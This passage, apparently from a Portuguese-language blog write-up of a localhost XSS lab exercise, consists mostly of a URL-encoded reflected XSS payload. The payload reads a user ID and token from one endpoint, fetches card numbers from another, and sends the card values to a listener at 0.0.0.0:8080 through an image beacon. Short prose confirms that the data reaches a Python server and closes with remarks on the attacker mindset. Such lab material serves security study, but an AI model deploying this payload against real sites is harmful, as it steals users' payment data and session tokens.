%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20link%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E](http://localhost/task-21/?search=%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20link%20%3D%20document.getElementById%28%22endpoints%22%29.href%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20cards%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09var%20parsed%20%3D%20cards.card_1%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_2%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_3%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20parsed%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fc1%3D%22%2Bcards.card_1%2B%22%26c2%3D%22%2Bcards.card_2%2B%22%26c3%3D%22%2Bcards.card_3%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20id%20%3D%20req.responseXML.getElementsByTagName%28%22user_id-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20token%20%3D%20req.responseXML.getElementsByTagName%28%22token-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20endpoint%20%3D%20req.responseXML.getElementsByTagName%28%22endpoint%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20endpoint%2B%22%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.open%28%22GET%22%2C%20link%2C%20true%29%3B%0A%09req.send%28%29%3B%0A%3C%2Fscript%3E)

Ao carregar a página, a informação sensível é carregada.

![Cartões](/img/posts/Pasted%20image%2020250123100745.png)

Logo em seguida, os dados são encaminhados para o *Python server*.

![Resultado](/img/posts/Pasted%20image%2020250123100803.png)
...
Esta ideia surgiu de vivência com várias pessoas e de alguns pontos onde realmente percebi que o que faltava não era conhecimento, mas sim o *mindset*, a malícia e a escolha de usar o XSS como vulnerabilidade. O principal é o "<span style="color: #1cce43">fora da caixa</span>".
